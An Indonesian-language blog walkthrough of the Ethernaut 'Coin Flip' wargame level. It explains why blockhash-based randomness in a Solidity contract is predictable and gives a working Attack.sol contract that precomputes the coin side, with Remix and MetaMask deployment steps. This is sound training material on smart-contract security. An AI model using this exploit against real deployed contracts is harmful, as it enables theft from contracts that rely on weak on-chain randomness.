---
title: "Level 3 - Coin Flip"
date: 2023-09-02T22:16:12+07:00
draft: false
tags: ["Ethernaut"]
categories: ["Smart Contract Securiy"]
---

Hai! Kembali lagi ke series belajar ethernaut, kita akan melanjutkan Level 3 yaitu Coin Flip. Lesgoo!

Pada level kali ini kita diberikan source code seperti berikut

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

> **Goals** : Menebak dengan benar sebanyak **_10 kali berturut-turut_**

### Breakdown the code

Let’s go kita bahas code yang menarik untuk dibahas

```solidity
function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));  **(1)**

    if (lastHash == blockValue) {                               **(2)**
      revert();
    }

    lastHash = blockValue;                                      **(3)**
    uint256 coinFlip = blockValue / FACTOR;                     **(4)**
    bool side = coinFlip == 1 ? true : false;                   **(5)**

    if (side == _guess) {                                       **(6)**
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
```

Pada smart contract ini hanya terdapat satu function saja `flip()` yang dimana membutuhkan sebuah parameter berupa boolean yang akan menentukan apakah tebakan kita akan sesuai atau tidak dengan random generate nya ini.

1. Pada nomor 1 ini merupakan sebuah deklarasi `blockValue` yang dimana akan assign nilai hash dari blok sebelumnya.
2. Kondisi pada nomor 2 ini mengecek apakah `lastHash` mempunyai kesamaan dengan hash di `blockValue` jika iya maka dia akan melakukan revert
3. `lastHash` di assign dengan `blockValue` jika kondisi pada nomor 2 tidak terpenuhi
4. Nomor 4 ini `coinFlip` akan di assign dari hasil perhitungan `blockValue / FACTOR`
5. Variable `side` ini akan mengecek apakah hasil dari `coinFlip` ini adalah `1` atau `0` , jika `1` maka `true` dan jika `0` maka `false`
6. Mengecek apakah `guess` kita benar dengan `side` yang sudah di acak

### Explainoit (Explain & Exploit)

Setelah memahami smart contract di atas, kita bisa melakukan exploit terhadap smart contract ini tetapi kita perlu perhatikan berikut ini:

1. Function `flip()` ini hanya bisa dipanggil satu kali dalam satu block, ini dijelaskan pada nomor 2 yang dimana akan melakukan `revert()` jika `lastHash` dan `blockValue` nya sama dengan yang sebelumnya.

Jadi sangat tidak memungkinkan untuk menang 10 kali dalam berturut-turut pada level ini. Tetapi kita bisa abuse karena:

1. Kita mengetahui bahwa `blockValue`akan mempunyai hash yang sama dan `blockValue` ini kita mengetahui dari `block.number` yang tidak random karena berupa hash dan hash tidak akan berubah pada `block.number` yang sama.
2. Angka yang dihasilkan dari `coinFlip` akan random tetapi karena `blockValue` nya mempunyai value yang sama maka hasilnya juga akan sama seperti sebelumnya sehingga chance untuk menangnya adalah 100%

Dari penjelasan di atas kita akan membuat sebuah script yang akan melakukan exploit dari smart contract di atas agar bisa melakukan coin flip setiap saat yang dimana kita tidak memelurkan kondisi pada nomor 2 dan memenangkannya selama 10x berturut-turut atau lebih.

Pada level ini kita akan menggunakan [Remix IDE](https://remix.ethereum.org/) untuk menyelesaikan level ini. Pertama kita akan membuat sebuah Folder dan disini saya memberi nama `3_Coin Flip`

{{< figure align=center src="/images/20230902/folder-cf.png" title="Folder Coin Flip di Remix" >}}

Pada folder tersebut buah 2 contract yang pertama adalah smart contract yang telah dikasih `CoinFlip.sol` dan kedua adalah `Attack.sol`. Masukkan smart contract original Coin Flip ke file `CoinFlip.sol` , lalu pada `Attack.sol` buat seperti berikut ini

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './CoinFlip.sol';

contract Attack {
    CoinFlip public coinContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(){
        coinContract = CoinFlip(**INSTANCE-ADDRESS**);
    }

    function AttackContract() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        coinContract.flip(side);
    }
}
```

Mungkin saya tidak akan menjelaskan secara detail, tetapi kita akan menghapus pengkondisian dan `lastHast` pada smart contract original agar kita bisa melewati code tersebut. Lalu disini juga kita memanggil contract `CoinFlip` yang diberi nama `coinContract`, pada **_constructor_** bagian `INSTANCE-ADDRESS` ganti dengan INSTANCE ADDRESS yang diberikan pada console browser

{{< figure align=center src="/images/20230902/instanceaddress.png" title="Instance Address dari Contract Level 3" >}}

Setelah semuanya siap, kita pertama-tama membutuhkan compile terlebih dahulu. Bisa diikuti seperti di gambar

{{< figure align=center src="/images/20230902/compiling.png" title="Compiling Contract" >}}

Setelah itu kita akan melakukan deploy smart contract, tetappi pertama-tama kita harus ubah `environment`nya terlebih dahulu ke `Injected Provider - MetaMask` agar bisa terhubung dengan instance nya dan nanti akan muncul popup `MetaMask` untuk connect account ganache kita yang terhubung ke Ethernaut

{{< figure align=center src="/images/20230902/changevm.png" title="Mengganti EVM di Remix" >}}

Setelah itu pastikan pada kolom `Contract` namanya adalah `Attack.sol` atau sesuaikan dengan nama yang menyimpan script untuk menyelesaikan level ini dan jika sudah klik `Deploy`

{{< figure align=center src="/images/20230902/attacksol.png" title="Memilih contract Attack.sol untuk di deploy" >}}

Nanti hasil deploy akan muncul dibawah pada `Deployed Contracts`

{{< figure align=center src="/images/20230902/deployedremix.png" title="Hasil Deployed Contract" >}}

Nah disini kalian cukup klik tombol orange yang tulisan `AttackContract` dan `Confirm` ketika popup `MetaMask` muncul sebanyak 10 kali 😂

{{< figure align=center src="/images/20230902/attackcontract.png" title="Menjalankan AttackContract dan konfirmasi Metamask" >}}

Untuk cek nya apakah sudah 10 kali atau belum kalian bisa ketikkan perintah berikut ini di console

```jsx
await contract.consecutiveWins().then((v) => v.toString());
```

{{< figure align=center src="/images/20230902/viewconsecutivewins.png" title="Melihat consecutiveWins di console" >}}

Jika sudah 10x maka kalian bisa klik `Submit Instance` dan level 3 selesai

{{< figure align=center src="/images/20230902/10consecutivewins.png" title="consecutiveWins mencapai 10" >}}
